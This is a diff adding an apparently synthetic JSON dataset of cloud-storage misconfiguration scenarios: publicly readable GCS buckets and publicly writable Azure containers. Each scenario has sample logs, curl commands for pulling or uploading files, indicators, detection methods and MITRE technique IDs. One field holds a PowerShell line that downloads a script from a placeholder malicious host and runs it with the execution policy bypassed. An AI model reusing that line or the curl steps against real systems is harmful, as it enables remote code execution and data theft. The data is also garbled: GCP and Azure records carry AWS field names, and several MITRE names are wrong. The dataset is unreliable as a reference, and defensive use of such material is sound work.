@@ -1,0 +1,260 @@
+{
+  "samples": [
+    {
+      "scenario": "Misconfigured Google Cloud Storage bucket with public read access leading to unauthorized data exposure of sensitive backup archives.",
+      "technical_data": {
+        "IAM_policy_misconfiguration": {
+          "bindings": [
+            {
+              "role": "roles/storage.objectViewer",
+              "members": [
+                "allUsers"
+              ]
+            }
+          ]
+        },
+        "CloudTrail_logs_excerpt": [
+          {
+            "eventVersion": "1.05",
+            "userIdentity": {
+              "type": "Anonymous",
+              "principalId": "ANONYMOUS"
+            },
+            "eventTime": "2024-06-10T08:15:42Z",
+            "eventSource": "storage.googleapis.com",
+            "eventName": "objects.get",
+            "region": "us-central1",
+            "sourceIPAddress": "34.102.136.180",
+            "userAgent": "Wget/1.20.3 (linux-gnu)",
+            "requestParameters": {
+              "bucketName": "corp-backups",
+              "objectName": "db-backup-20240609.tar.gz"
+            },
+            "responseElements": {
+              "status": "200"
+            },
+            "requestID": "GCS1234567890",
+            "eventType": "ApiCall",
+            "recipientProjectId": "my-gcp-project"
+          }
+        ],
+        "S3_access_logs_sample": [
+          "2024-06-10T08:15:42Z anon 34.102.136.180 GET corp-backups db-backup-20240609.tar.gz 200 Wget/1.20.3"
+        ],
+        "curl_exploit_example": "curl -O https://storage.googleapis.com/corp-backups/db-backup-20240609.tar.gz",
+        "shell_php_content": "",
+        "AWS_CLI_command_for_listing_bucket_acls": "gsutil iam get gs://corp-backups",
+        "Bucket_ACL_response": {
+          "bindings": [
+            {
+              "role": "roles/storage.objectViewer",
+              "members": [
+                "allUsers"
+              ]
+            }
+          ]
+        }
+      },
+      "indicators": [
+        "Bucket IAM policy binding role 'roles/storage.objectViewer' to 'allUsers' allowing public read.",
+        "Anonymous GET requests to backup archive files seen in CloudAudit logs.",
+        "Access logs showing external IPs downloading large backup archives.",
+        "Use of command line tools like wget or curl downloading sensitive files.",
+        "Lack of authentication or encryption on sensitive storage bucket.",
+        "No restrictions on object-level permissions leading to data leakage."
+      ],
+      "detection_method": "Regular scanning of GCP bucket IAM policies for bindings granting 'allUsers' or 'allAuthenticatedUsers' roles, continuous monitoring of Cloud Audit Logs for anonymous or unusual GET object operations, anomaly detection on download sizes and frequency, and alerts on access from unexpected geographic locations or user agents.",
+      "relevant_mitre_techniques": [
+        "T1530 - Data from Cloud Storage Object",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1496 - Resource Hijacking",
+        "T1560.001 - Archive Collected Data: Archive via Cloud Storage"
+      ]
+    },
+    {
+      "scenario": "Misconfigured Azure Blob Storage container with public write access allowing unauthenticated users to upload malicious files and overwrite existing data.",
+      "technical_data": {
+        "IAM_policy_misconfiguration": {
+          "publicAccessLevel": "Blob",
+          "permissions": {
+            "container": "public",
+            "publicWrite": true
+          }
+        },
+        "CloudTrail_logs_excerpt": [
+          {
+            "eventVersion": "1.0",
+            "userIdentity": {
+              "type": "Anonymous"
+            },
+            "eventTime": "2024-06-15T22:30:10Z",
+            "eventSource": "blob.core.windows.net",
+            "eventName": "PutBlob",
+            "awsRegion": "eastus",
+            "sourceIPAddress": "52.160.10.25",
+            "userAgent": "Azure-Storage/1.0",
+            "requestParameters": {
+              "containerName": "prod-logs",
+              "blobName": "ransomware.exe"
+            },
+            "responseElements": {
+              "statusCode": 201
+            },
+            "requestID": "AZURE1234567890",
+            "eventType": "ApiCall",
+            "recipientAccountId": "876543210987"
+          }
+        ],
+        "S3_access_logs_sample": [
+          "2024-06-15T22:30:10Z anon 52.160.10.25 PUT prod-logs ransomware.exe 201 Azure-Storage/1.0"
+        ],
+        "curl_exploit_example": "curl -X PUT --upload-file ransomware.exe https://prod-logs.blob.core.windows.net/prod-logs/ransomware.exe",
+        "shell_php_content": "MZ...PE header indicating a Windows executable (malware payload)",
+        "AWS_CLI_command_for_listing_bucket_acls": "az storage container show-permission --name prod-logs --account-name prodstorageacct",
+        "Bucket_ACL_response": {
+          "publicAccess": "Blob",
+          "signedIdentifiers": []
+        }
+      },
+      "indicators": [
+        "Azure Blob Storage container set with public access level allowing Blob write.",
+        "Anonymous PutBlob requests uploading executable files detected in audit logs.",
+        "Access logs showing HTTP PUT requests from external IPs with suspicious filenames.",
+        "Uploaded files contain malware payload signatures (e.g., PE headers).",
+        "Use of curl or Azure-Storage clients by anonymous users for upload operations.",
+        "Container permissions allowing unauthenticated write and overwrite operations."
+      ],
+      "detection_method": "Automated periodic checks of Azure Blob Storage container permissions via Azure CLI or APIs, correlation of Azure Activity Logs for anonymous PutBlob events, anomaly detection on blob names and file types being uploaded, and alerting on uploads of executable or script files to public containers.",
+      "relevant_mitre_techniques": [
+        "T1530 - Data from Cloud Storage Object",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1496 - Resource Hijacking",
+        "T1560.001 - Archive Collected Data: Archive via Cloud Storage"
+      ]
+    },
+    {
+      "scenario": "Misconfigured Google Cloud Storage bucket with public read access exposing sensitive financial reports and allowing anonymous downloads.",
+      "technical_data": {
+        "IAM_policy_misconfiguration": {
+          "bindings": [
+            {
+              "role": "roles/storage.objectViewer",
+              "members": [
+                "allUsers"
+              ]
+            }
+          ]
+        },
+        "CloudTrail_logs_excerpt": null,
+        "GCP_Audit_logs_excerpt": [
+          {
+            "protoPayload": {
+              "@type": "type.googleapis.com/google.cloud.audit.AuditLog",
+              "authenticationInfo": {
+                "principalEmail": "anonymous"
+              },
+              "requestMetadata": {
+                "callerIp": "198.51.100.77",
+                "userAgent": "Wget/1.20.3 (linux-gnu)"
+              },
+              "resourceName": "projects/_/buckets/example-financial-bucket/objects/q2-2024-financials.xlsx",
+              "methodName": "storage.objects.get",
+              "serviceName": "storage.googleapis.com",
+              "status": {}
+            },
+            "timestamp": "2024-06-10T10:15:30Z",
+            "resource": {
+              "labels": {
+                "bucket_name": "example-financial-bucket"
+              }
+            }
+          }
+        ],
+        "GCS_access_logs_sample": [
+          "2024-06-10T10:15:30.123Z example-financial-bucket storage.objects.get 198.51.100.77 Wget/1.20.3 (linux-gnu) example-financial-bucket q2-2024-financials.xlsx 200"
+        ],
+        "curl_exploit_example": "curl -O https://storage.googleapis.com/example-financial-bucket/q2-2024-financials.xlsx",
+        "suspicious_file_content_sample": null,
+        "GCP_CLI_command_for_listing_bucket_iam": "gsutil iam get gs://example-financial-bucket",
+        "Bucket_IAM_response": {
+          "bindings": [
+            {
+              "role": "roles/storage.objectViewer",
+              "members": [
+                "allUsers"
+              ]
+            }
+          ]
+        }
+      },
+      "indicators": [
+        "GCS bucket IAM policy includes roles/storage.objectViewer granted to allUsers (public read).",
+        "Audit logs showing storage.objects.get calls from anonymous principal and external IPs.",
+        "Access logs confirming HTTP GET requests for sensitive financial report files.",
+        "User agents like Wget used by anonymous users to download confidential data.",
+        "No authentication required to access sensitive bucket objects."
+      ],
+      "detection_method": "Use automated tools to scan GCS bucket IAM policies for public read permissions, analyze audit logs for anonymous object read events, monitor access logs for unusual download patterns from external IPs, and alert on downloads of sensitive file types from publicly accessible buckets.",
+      "relevant_mitre_techniques": [
+        "T1530 - Data from Cloud Storage Object",
+        "T1078.004 - Valid Accounts: Cloud Accounts",
+        "T1567.002 - Exfiltration Over Web Service: Cloud Storage",
+        "T1537 - Transfer Data to Cloud Account"
+      ]
+    },
+    {
+      "scenario": "Misconfigured Azure Blob Storage container with public write access allowing unauthorized upload of malicious scripts and data exfiltration.",
+      "technical_data": {
+        "IAM_policy_misconfiguration": {
+          "containerPublicAccess": "Blob"
+        },
+        "AzureActivity_logs_excerpt": [
+          {
+            "eventTimestamp": "2024-06-12T08:30:45Z",
+            "operationName": "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/write",
+            "status": "Succeeded",
+            "callerIpAddress": "203.0.113.88",
+            "identity": {
+              "type": "Anonymous"
+            },
+            "resourceId": "/subscriptions/abc123/resourceGroups/rg-example/providers/Microsoft.Storage/storageAccounts/exampleblobstorage/blobServices/default/containers/public-container/blobs/malicious.ps1",
+            "userAgent": "Mozilla/5.0 (compatible; EvilScanner/1.0; +http://malicious.example.com)"
+          },
+          {
+            "eventTimestamp": "2024-06-12T08:45:12Z",
+            "operationName": "Microsoft.Storage/storageAccounts/blobServices/containers/blobs/read",
+            "status": "Succeeded",
+            "callerIpAddress": "198.51.100.99",
+            "identity": {
+              "type": "Anonymous"
+            },
+            "resourceId": "/subscriptions/abc123/resourceGroups/rg-example/providers/Microsoft.Storage/storageAccounts/exampleblobstorage/blobServices/default/containers/public-container/blobs/confidential_data.zip",
+            "userAgent": "curl/7.68.0"
+          }
+        ],
+        "AzureStorage_access_logs_sample": [
+          "2024-06-12T08:30:45Z 203.0.113.88 anonymous PUT https://exampleblobstorage.blob.core.windows.net/public-container/malicious.ps1 201 Mozilla/5.0 (compatible; EvilScanner/1.0; +http://malicious.example.com)",
+          "2024-06-12T08:45:12Z 198.51.100.99 anonymous GET https://exampleblobstorage.blob.core.windows.net/public-container/confidential_data.zip 200 curl/7.68.0"
+        ],
+        "curl_exploit_example": "curl -X PUT --upload-file evilscript.ps1 https://exampleblobstorage.blob.core.windows.net/public-container/malicious.ps1",
+        "malicious_ps1_content": "Invoke-WebRequest -Uri http://malicious.example.com/payload.ps1 -OutFile payload.ps1; powershell -ExecutionPolicy Bypass -File payload.ps1",
+        "Azure_CLI_command_for_checking_container_public_access": "az storage container show --account-name exampleblobstorage --name public-container --query publicAccess",
+        "Container_public_access_response": "Blob"
+      },
+      "indicators": [
+        "Azure Blob Storage container configured with public read and write access (publicAccess: Blob).",
+        "Activity logs showing anonymous PUT operations uploading PowerShell scripts.",
+        "Access logs indicating GET requests from anonymous users downloading sensitive archives.",
+        "User agents mimicking scanners or curl used for uploading/downloading blobs.",
+        "Presence of malicious PowerShell script content in uploaded blobs."
+      ],
+      "detection_method": "Scan Azure Blob Storage container ACLs for public write access, correlate Azure Activity logs for anonymous blob write events, monitor access logs for suspicious user agents and file types, and alert on uploads of executable or script files to publicly accessible containers.",
+      "relevant_mitre_techniques": [
+        "T1530 - Data from Cloud Storage Object",
+        "T1560.001 - Archive Collected Data: Archive via Cloud Storage",
+        "T1496 - Resource Hijacking",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell"
+      ]
+    }
+  ]
+}
